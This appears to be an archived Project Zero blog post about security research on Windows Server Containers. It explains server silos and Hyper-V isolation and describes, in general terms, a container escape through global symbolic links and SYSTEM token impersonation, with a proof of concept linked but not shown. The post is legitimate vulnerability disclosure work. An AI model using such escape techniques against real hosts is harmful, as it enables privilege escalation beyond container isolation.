<?xml version='1.0' encoding='UTF-8'?><?xml-stylesheet href="http://www.blogger.com/styles/atom.css" type="text/css"?><entry xmlns='http://www.w3.org/2005/Atom' xmlns:blogger='http://schemas.google.com/blogger/2008' xmlns:georss='http://www.georss.org/georss' xmlns:gd='http://schemas.google.com/g/2005' xmlns:thr='http://purl.org/syndication/thread/1.0'><id>tag:blogger.com,1999:blog-4838136820032157985.post-1279312763048126065</id><published>2021-04-01T09:06:00.001-07:00</published><updated>2022-08-24T11:00:22.271-07:00</updated><title type='text'>Who Contains the Containers?</title><content type='html'>&lt;style type=&quot;text/css&quot;&gt;ol.lst-kix_skzdkacf7dv6-0.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-0 0}.lst-kix_skzdkacf7dv6-0&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-0}ol.lst-kix_upj84fi5ja9o-7.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-7 0}ol.lst-kix_xgd2a7n379wd-3.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-3 0}ol.lst-kix_skzdkacf7dv6-3.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-3 0}ol.lst-kix_xgd2a7n379wd-6.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-6 0}.lst-kix_upj84fi5ja9o-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_upj84fi5ja9o-0,decimal) &quot;. &quot;}.lst-kix_upj84fi5ja9o-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_upj84fi5ja9o-3,decimal) &quot;. &quot;}.lst-kix_skzdkacf7dv6-1&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-1}.lst-kix_upj84fi5ja9o-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_upj84fi5ja9o-2,lower-roman) &quot;. &quot;}.lst-kix_upj84fi5ja9o-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_upj84fi5ja9o-1,lower-latin) &quot;. &quot;}ol.lst-kix_upj84fi5ja9o-4.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-4 0}.lst-kix_upj84fi5ja9o-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_upj84fi5ja9o-7,lower-latin) &quot;. &quot;}.lst-kix_upj84fi5ja9o-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_upj84fi5ja9o-6,decimal) &quot;. &quot;}.lst-kix_upj84fi5ja9o-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_upj84fi5ja9o-8,lower-roman) &quot;. &quot;}.lst-kix_upj84fi5ja9o-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_upj84fi5ja9o-4,lower-latin) &quot;. &quot;}.lst-kix_upj84fi5ja9o-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_upj84fi5ja9o-5,lower-roman) &quot;. &quot;}ol.lst-kix_xgd2a7n379wd-8{list-style-type:none}.lst-kix_skzdkacf7dv6-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_skzdkacf7dv6-7,lower-latin) &quot;. &quot;}.lst-kix_skzdkacf7dv6-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_skzdkacf7dv6-6,decimal) &quot;. &quot;}.lst-kix_skzdkacf7dv6-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_skzdkacf7dv6-5,lower-roman) &quot;. &quot;}ol.lst-kix_xgd2a7n379wd-0{list-style-type:none}.lst-kix_upj84fi5ja9o-0&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-0}ol.lst-kix_xgd2a7n379wd-1{list-style-type:none}.lst-kix_xgd2a7n379wd-1&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-1}ol.lst-kix_xgd2a7n379wd-2{list-style-type:none}ol.lst-kix_xgd2a7n379wd-3{list-style-type:none}ol.lst-kix_xgd2a7n379wd-4{list-style-type:none}ol.lst-kix_xgd2a7n379wd-5{list-style-type:none}.lst-kix_skzdkacf7dv6-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_skzdkacf7dv6-4,lower-latin) &quot;. &quot;}ol.lst-kix_xgd2a7n379wd-6{list-style-type:none}ol.lst-kix_xgd2a7n379wd-7{list-style-type:none}.lst-kix_skzdkacf7dv6-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_skzdkacf7dv6-1,lower-latin) &quot;. &quot;}.lst-kix_skzdkacf7dv6-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_skzdkacf7dv6-2,lower-roman) &quot;. &quot;}.lst-kix_xgd2a7n379wd-7&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-7}ol.lst-kix_xgd2a7n379wd-8.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-8 0}.lst-kix_upj84fi5ja9o-2&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-2}.lst-kix_skzdkacf7dv6-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_skzdkacf7dv6-3,decimal) &quot;. &quot;}ol.lst-kix_upj84fi5ja9o-2.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-2 0}.lst-kix_skzdkacf7dv6-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_skzdkacf7dv6-0,decimal) &quot;. &quot;}ol.lst-kix_skzdkacf7dv6-8.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-8 0}ol.lst-kix_xgd2a7n379wd-1.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-1 0}.lst-kix_upj84fi5ja9o-8&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-8}.lst-kix_xgd2a7n379wd-6&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-6}.lst-kix_xgd2a7n379wd-0&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-0}ol.lst-kix_xgd2a7n379wd-7.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-7 0}ol.lst-kix_upj84fi5ja9o-1.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-1 0}.lst-kix_skzdkacf7dv6-4&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-4}.lst-kix_skzdkacf7dv6-7&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-7}ol.lst-kix_xgd2a7n379wd-0.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-0 0}ol.lst-kix_skzdkacf7dv6-2.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-2 0}ol.lst-kix_upj84fi5ja9o-8.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-8 0}ol.lst-kix_upj84fi5ja9o-0{list-style-type:none}ol.lst-kix_upj84fi5ja9o-0.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-0 0}ol.lst-kix_upj84fi5ja9o-2{list-style-type:none}ol.lst-kix_upj84fi5ja9o-1{list-style-type:none}.lst-kix_upj84fi5ja9o-5&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-5}.lst-kix_xgd2a7n379wd-4&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-4}.lst-kix_skzdkacf7dv6-5&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-5}ol.lst-kix_upj84fi5ja9o-8{list-style-type:none}ol.lst-kix_upj84fi5ja9o-7{list-style-type:none}.lst-kix_xgd2a7n379wd-3&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-3}ol.lst-kix_upj84fi5ja9o-4{list-style-type:none}ol.lst-kix_upj84fi5ja9o-3{list-style-type:none}ol.lst-kix_upj84fi5ja9o-6{list-style-type:none}ol.lst-kix_upj84fi5ja9o-5{list-style-type:none}ol.lst-kix_upj84fi5ja9o-6.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-6 0}ol.lst-kix_skzdkacf7dv6-3{list-style-type:none}ol.lst-kix_skzdkacf7dv6-4{list-style-type:none}ol.lst-kix_skzdkacf7dv6-5{list-style-type:none}ol.lst-kix_skzdkacf7dv6-6{list-style-type:none}ol.lst-kix_skzdkacf7dv6-0{list-style-type:none}ol.lst-kix_xgd2a7n379wd-2.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-2 0}.lst-kix_upj84fi5ja9o-6&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-6}ol.lst-kix_skzdkacf7dv6-1{list-style-type:none}ol.lst-kix_skzdkacf7dv6-2{list-style-type:none}ol.lst-kix_skzdkacf7dv6-4.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-4 0}ol.lst-kix_skzdkacf7dv6-1.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-1 0}ol.lst-kix_skzdkacf7dv6-7{list-style-type:none}ol.lst-kix_skzdkacf7dv6-8{list-style-type:none}ol.lst-kix_upj84fi5ja9o-3.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-3 0}.lst-kix_upj84fi5ja9o-3&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-3}.lst-kix_skzdkacf7dv6-6&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-6}.lst-kix_skzdkacf7dv6-3&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-3}ol.lst-kix_xgd2a7n379wd-5.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-5 0}ol.lst-kix_skzdkacf7dv6-7.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-7 0}.lst-kix_xgd2a7n379wd-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_xgd2a7n379wd-7,lower-latin) &quot;. &quot;}.lst-kix_xgd2a7n379wd-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_xgd2a7n379wd-5,lower-roman) &quot;. &quot;}.lst-kix_xgd2a7n379wd-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_xgd2a7n379wd-6,decimal) &quot;. &quot;}ol.lst-kix_upj84fi5ja9o-5.start{counter-reset:lst-ctn-kix_upj84fi5ja9o-5 0}.lst-kix_xgd2a7n379wd-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_xgd2a7n379wd-3,decimal) &quot;. &quot;}ol.lst-kix_skzdkacf7dv6-5.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-5 0}.lst-kix_skzdkacf7dv6-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_skzdkacf7dv6-8,lower-roman) &quot;. &quot;}.lst-kix_xgd2a7n379wd-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_xgd2a7n379wd-4,lower-latin) &quot;. &quot;}.lst-kix_xgd2a7n379wd-2&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-2}.lst-kix_skzdkacf7dv6-2&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-2}.lst-kix_skzdkacf7dv6-8&gt;li{counter-increment:lst-ctn-kix_skzdkacf7dv6-8}.lst-kix_xgd2a7n379wd-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_xgd2a7n379wd-1,lower-latin) &quot;. &quot;}.lst-kix_upj84fi5ja9o-1&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-1}.lst-kix_xgd2a7n379wd-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_xgd2a7n379wd-2,lower-roman) &quot;. &quot;}.lst-kix_xgd2a7n379wd-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_xgd2a7n379wd-0,decimal) &quot;. &quot;}ol.lst-kix_skzdkacf7dv6-6.start{counter-reset:lst-ctn-kix_skzdkacf7dv6-6 0}ol.lst-kix_xgd2a7n379wd-4.start{counter-reset:lst-ctn-kix_xgd2a7n379wd-4 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_upj84fi5ja9o-4&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-4}.lst-kix_upj84fi5ja9o-7&gt;li{counter-increment:lst-ctn-kix_upj84fi5ja9o-7}.lst-kix_xgd2a7n379wd-5&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-5}.lst-kix_xgd2a7n379wd-8&gt;li{counter-increment:lst-ctn-kix_xgd2a7n379wd-8}.lst-kix_xgd2a7n379wd-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_xgd2a7n379wd-8,lower-roman) &quot;. &quot;}ol{margin:0;padding:0}table td,table th{padding:0}.c24{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c5{background-color:#ffffff;color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:&quot;Courier New&quot;;font-style:normal}.c11{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Arial&quot;;font-style:normal}.c12{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c1{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Courier New&quot;;font-style:normal}.c40{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Arial&quot;}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c10{padding-top:0pt;padding-bottom:0pt;line-height:1.500000000000001;orphans:2;widows:2;text-align:left}.c15{color:#006400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-style:normal}.c7{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c22{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.c27{color:#8b0000;text-decoration:none;vertical-align:baseline;font-style:normal}.c0{font-size:10pt;font-family:&quot;Courier New&quot;;color:#0000ff;font-weight:400}.c13{border-spacing:0;border-collapse:collapse;margin-right:auto}.c23{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c6{font-size:10pt;font-family:&quot;Courier New&quot;;color:#8a2be2;font-weight:400}.c34{font-weight:400;font-size:16pt;font-family:&quot;Arial&quot;}.c30{font-weight:700;font-size:11pt;font-family:&quot;Courier New&quot;}.c19{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c33{text-decoration:none;vertical-align:baseline;font-style:normal}.c18{font-family:&quot;Courier New&quot;;color:#000080;font-weight:700}.c21{font-family:&quot;Courier New&quot;;color:#0000ff;font-weight:700}.c8{font-weight:400;font-family:&quot;Courier New&quot;}.c41{background-color:#ffffff;font-size:11.5pt}.c38{padding:0;margin:0}.c25{margin-left:36pt;padding-left:0pt}.c16{font-size:10pt;color:#696969}.c31{color:inherit;text-decoration:inherit}.c14{background-color:#ffffff;font-size:10pt}.c28{color:#006161}.c17{font-size:10pt}.c26{color:#800080}.c43{color:#008000}.c32{color:#000080}.c9{height:0pt}.c36{color:#8b0000}.c20{color:#a82d00}.c2{font-style:italic}.c37{color:#0000ff}.c35{font-weight:700}.c29{color:#006400}.c39{color:#ff8000}.c42{font-size:12pt}.c4{height:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}p{margin:0;color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=&quot;c19&quot;&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;Posted by James Forshaw, Project Zero&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;This is a &lt;/span&gt;&lt;span&gt;short blog post&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;about a research project I conducted on Windows Server Containers that resulted in four privilege escalations which Microsoft fixed in March 2021. In the post, I describe what led to this research, my research process, and insights into what to look for if you&amp;rsquo;re researching this area.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;c12&quot; id=&quot;h.nq1xwb8173m&quot;&gt;&lt;span class=&quot;c22 c34&quot;&gt;Windows Containers Background&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Windows 10 and its server counterparts added support for application containerization. The implementation in Windows is similar in concept to Linux containers, but of course wildly different. The well-known Docker platform supports Windows containers which leads to the availability of related projects such as Kubernetes running on Windows. You can read a bit of background on Windows containers on &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://docs.microsoft.com/en-us/virtualization/windowscontainers/about/&quot;&gt;MSDN&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;. I&amp;rsquo;m not going to go in any depth on how containers work in Linux as very little is applicable to Windows.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;The primary goal of a container is to hide the real OS from an application. For example, in Docker you can download a standard container image which contains a completely separate copy of Windows. The image is used to build the container which uses a feature of the Windows kernel called a &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;Server Silo&lt;/span&gt;&lt;span&gt;&amp;nbsp;allowing for redirection of resources such as the object manager, registry and networking. The server silo is a special type of &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://docs.microsoft.com/en-us/windows/win32/procthread/job-objects&quot;&gt;Job object&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;, which can be assigned to a process. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggoaxszHhU8XtZZviy-QTmmvuPMOBrXBlZIaFN5XcItB-BObHVtxWwx5iIvVHSX3FCHHwuTyEgC8E4FqpvSdsMHhfjxtSA-jbVXTj628FgSAtuQXLDqEhoVMFRDKJf-SDLFkGgbx-hKlDO1gv8QIYmQjRoP1ISYIWz_0EQdsCTaT3QzAw0_DWo861z/s759/image1%20%283%29.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggoaxszHhU8XtZZviy-QTmmvuPMOBrXBlZIaFN5XcItB-BObHVtxWwx5iIvVHSX3FCHHwuTyEgC8E4FqpvSdsMHhfjxtSA-jbVXTj628FgSAtuQXLDqEhoVMFRDKJf-SDLFkGgbx-hKlDO1gv8QIYmQjRoP1ISYIWz_0EQdsCTaT3QzAw0_DWo861z/s759/image1%20%283%29.png&quot; border=&quot;0&quot; alt=&quot;Diagram of a server silo. Shows an application interacting with the registry, object manager and network and how being in the silo redirects that access to another location.&quot; style=&quot;max-height: 750; max-width: 600px;&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;The application running in the container, as far as possible, will believe it&amp;rsquo;s running in its own unique OS instance. Any changes it makes to the system will only affect the container and not the real OS which is hosting it. This allows an administrator to bring up new instances of the application easily as any system or OS differences can be hidden. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;For example the container could be moved between different Windows systems, or even to a Linux system with the appropriate virtualization and the application shouldn&amp;rsquo;t be able to tell the difference. Containers shouldn&amp;rsquo;t be confused with virtualization however, which &lt;/span&gt;&lt;span&gt;provides a consistent hardware interface to the OS.&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;A container is more about providing a consistent OS interface to applications.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;Realistically, containers are mainly about using their isolation primitives for hiding the real OS and providing a consistent configuration in which an application can execute. However, there&amp;rsquo;s also some potential security benefit to running inside a container, as the application shouldn&amp;rsquo;t be able to directly interact with other processes and resources on the host.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;There are two supported types of containers: Windows Server Containers and &lt;/span&gt;&lt;span class=&quot;c41&quot;&gt;Hyper-V Isolated Containers&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;. Windows Server Containers run under the current kernel as separate processes inside a server silo. Therefore a single kernel vulnerability would allow you to escape the container and access the host system.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Hyper-V Isolated Containers still run in a server silo, but do so in a separate lightweight VM. You can still use the same kernel vulnerability to escape the server silo, but you&amp;rsquo;re still constrained by the VM and hypervisor. &lt;/span&gt;&lt;span&gt;To fully escape and access the host you&amp;rsquo;d need a separate VM escape as well.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiarEC3Bn2j5NBlxaGLipxyDrwffGDZDs2kyVb1gkQoQYbrkxVF_XbbLfb3Vi3xoCrKGNkS5xdC-oWPkKDZ3-wOSkeQWUcLRUiptb925BEOOmHiZ_LNME_0GkUHROT5lCaOUvYqKXxnfehMzpw9hoiUhJcLaGynT2NiwRnK4dxW-fEToGgTjnEVYr1H/s608/image2%20%282%29.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiarEC3Bn2j5NBlxaGLipxyDrwffGDZDs2kyVb1gkQoQYbrkxVF_XbbLfb3Vi3xoCrKGNkS5xdC-oWPkKDZ3-wOSkeQWUcLRUiptb925BEOOmHiZ_LNME_0GkUHROT5lCaOUvYqKXxnfehMzpw9hoiUhJcLaGynT2NiwRnK4dxW-fEToGgTjnEVYr1H/s608/image2%20%282%29.png&quot; border=&quot;0&quot; alt=&quot;Diagram comparing Windows Server Containers and Hyper-V Isolated Containers. The server container on the left directly accesses the hosts kernel. For Hyper-V the container accesses a virtualized kernel, which dispatches to the hypervisor and then back to the original host kernel. This shows the additional security boundary in place to make Hyper-V isolated containers more secure.&quot; style=&quot;max-height: 750; max-width: 600px;&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;The current &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://www.microsoft.com/en-us/msrc/windows-security-servicing-criteria&quot;&gt;MSRC security servicing criteria&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;states that Windows Server Containers are not a security boundary as you still have direct access to the kernel. However, if you use Hyper-V isolation, a silo escape wouldn&amp;rsquo;t compromise the host OS directly as the security boundary is at the hypervisor level. That said, escaping the server silo is likely to be the first step in attacking Hyper-V containers meaning an escape is still useful as part of a chain.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span class=&quot;c11&quot;&gt;As Windows Server Containers are not a security boundary any bugs in the feature won&amp;rsquo;t result in a security bulletin being issued. Any issues might be fixed in the next major version of Windows, but they might not be.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;c12&quot; id=&quot;h.p0j52mkkwgkj&quot;&gt;&lt;span class=&quot;c22 c34&quot;&gt;Origins of the Research&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Over a year ago I was asked for some advice by &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://unit42.paloaltonetworks.com/author/daniel-prizmant/&quot;&gt;Daniel Prizmant&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;a researcher at Palo Alto Networks&lt;/span&gt;&lt;span&gt;&amp;nbsp;on some details around Windows object manager symbolic links. Daniel was doing research into &lt;/span&gt;&lt;span&gt;Windows containers&lt;/span&gt;&lt;span&gt;, and wanted help on a feature which allows symbolic links to be marked as global which allows them to reference objects outside the server silo. I recommend reading Daniel&amp;rsquo;s &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://unit42.paloaltonetworks.com/what-i-learned-from-reverse-engineering-windows-containers/&quot;&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;&amp;nbsp;for more in-depth information about Windows containers.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;Knowing a little bit about symbolic links I was able to help fill in some details and usage. About seven months later Daniel released a second &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/&quot;&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;, this time describing how to use global symbolic links to escape a server silo Windows container. The result of the exploit is the user in the container can access resources outside of the container, such as files.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3&quot;&gt;&lt;span&gt;The global symbolic link feature needs &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;SeTcbPrivilege&lt;/span&gt;&lt;span&gt;&amp;nbsp;to be enabled, which can only be accessed from SYSTEM. The exploit therefore involved injecting into a system process from the default administrator user and running the exploit from there. Based on the blog post, I thought it could be done easier without injection. You could impersonate a &lt;/span&gt;&lt;span class=&quot;c2&quot;&gt;SYSTEM &lt;/span&gt;&lt;span&gt;token and do the exploit all in process. I wrote a simple proof-of-concept in PowerShell and put it up on &lt;/span&gt;&lt;span class=&quot;c23&quot;&gt;&lt;a class=&quot;c311&quot; href=&quot;https://gist.github.com/tyranid/bf8a890e615d310c7193901a1c7e0e3a&quot;&gt;Github&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;c11&quot;&gt;. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;c3 c4&quot;&gt;&lt;span class=&quot;c11&quot;&gt;&lt;/span&gt;&lt;/p&gt;
